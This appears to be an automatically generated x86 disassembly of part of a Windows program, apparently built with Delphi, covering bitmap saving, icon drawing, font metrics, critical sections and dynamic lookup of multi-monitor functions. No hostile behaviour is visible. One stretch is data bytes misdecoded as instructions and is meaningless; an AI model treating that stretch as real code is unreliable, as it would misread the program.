call [ ecx + 0x10 ]
sub_427e34
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b80
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_427000
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_423c2c
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41a624
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41a624
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b80
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_426ec4
mov dl [ r-xdata ]
call sub_422ac4
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_422de8
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_425fdc
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41a624
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41a624
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41a624
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41a624
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41a624
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41a624
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_423258
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41a624
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_42357c
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_4280f4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_427084
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_426028
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42816e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_42668c
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428194
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_4281dc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_423f68
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_425e54
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_428230
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_425e58
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41847c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_428260
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_428538
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_425e54
mov eax [ esi + 0x28 ]
call sub_425e58
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4184a8
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_4282c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_422ac4
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_428318
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_428354
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41a3e0
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41a5ec
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_423828
jmp r-xdata
jmp r-xdata
call sub_422cd4
sub_4283cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428459
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_428318
cmp eax [ rw-data ]
jne r-xdata
call sub_422cd4
mov eax esi
call sub_428318
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_423d6c
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402b80
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41a624
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_428480
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42850e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41a3c0
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41a5ec
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41a5ec
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_428538
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_422cd4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428513
mov eax [ ebp - 0x4 ]
call sub_40316c
call sub_403920
call sub_403974
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428538
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428578
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_425e54
mov eax [ ebx + 0x28 ]
call sub_425e58
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4285f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4283cc
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41a624
pop esi
pop ebx
retn
sub_428648
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_423328
mov [ rw-data ] eax
pop ebx
retn
sub_428680
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_4286c4
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call sub_4063e4
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_428680
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call sub_4063e4
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_428790
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4287c8
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
call sub_4289c0
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_42880c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4287f4
xor eax eax
push ebp
push sub_4288ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4288b4
mov eax [ ebp - 0x4 ]
call sub_428800
retn
mov eax 0x10
call sub_4026dc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4288c0
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_4288c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42899f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_426ec4
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_422314
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_4221f8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416a60
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_4225d0
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_422984
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_426b80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4289c0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4287f4
xor eax eax
push ebp
push sub_428a0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428a12
mov eax [ ebp - 0x4 ]
call sub_428800
retn
mov esp ebp
pop ebp
retn
sub_428a12
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_40316c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4287f4
xor eax eax
push ebp
push sub_428a0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428a12
mov eax [ ebp - 0x4 ]
call sub_428800
retn
mov esp ebp
pop ebp
retn
sub_428a38
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_42154c
push eax
mov eax ebx
call sub_42154c
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42880c
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_428a70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428b39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428b40
retn
mov eax [ rw-data ]
call sub_40316c
mov eax [ rw-data ]
call sub_40316c
mov eax [ rw-data ]
call sub_40316c
call sub_425b38
mov eax [ rw-data ]
call sub_40316c
mov eax [ rw-data ]
call sub_40316c
mov eax [ rw-data ]
call sub_40316c
mov eax [ rw-data ]
call sub_40316c
mov eax [ rw-data ]
call sub_40316c
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_4049c8
sub_428b44
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_428648
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_4286c4
mov cx 0x2c
mov dl 0x1
mov eax [ sub_420c90 ]
call sub_420d04
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_420c90 ]
call sub_420d04
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_420c90 ]
call sub_420d04
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428790
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418100
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418100
mov [ rw-data ] eax
mov ecx sub_42155c
mov edx sub_42156c
mov eax [ r-xdata ]
call sub_41785c
mov ecx r-xdata
mov edx sub_421774
mov eax [ r-xdata ]
call sub_41785c
sub_428c50
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428c75
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c7c
retn
sub_428c8c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x8c
inc edx
add [ eax + eax ] dl
add [ eax ] al
inc eax
pop eax
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bl
jge r-xdata
or [ eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add [ esi + edi * 2 - 0x71efffbf ] bh
inc edx
add [ ebp + edi * 2 + 0x41 ] ch
add al ch
jge r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax + 0x6c00428e ] bl
sub [ eax ] eax
fmul [ esi - 0x7137ffbe ]
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0xa400408d
lea eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x8d
inc edx
add [ eax ] cl
add [ eax ] al
add al dh
mov [ edx ] es
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax - 0x3ffbd72 ] bl
mov es [ edx ]
fmul [ esi - 0x7137ffbe ]
inc edx
add [ esi ] al
add ah al
xor eax [ eax ]
enter 0x4033 0x0
cmp al 0x8d
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x73 ] cl
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x4bffbff0 ] dh
xor eax [ eax ]
shl [ ebx ] 0x40
mov ecx ebx
mov edx edi
mov eax esi
call sub_4180fc
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_40316c
sub_428db8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_428e10
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_4180fc
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_40316c
sub_428e54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_428e98
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_428edc
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_417d84
mov eax esi
pop esi
pop ebx
retn
sub_428f08
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428f2d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428f34
retn
sub_429004
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429029
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429030
retn
sub_42903c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_4290fb
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429102
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42903c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f40
sub_429124
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42903c
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_4291ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42903c
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42923c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
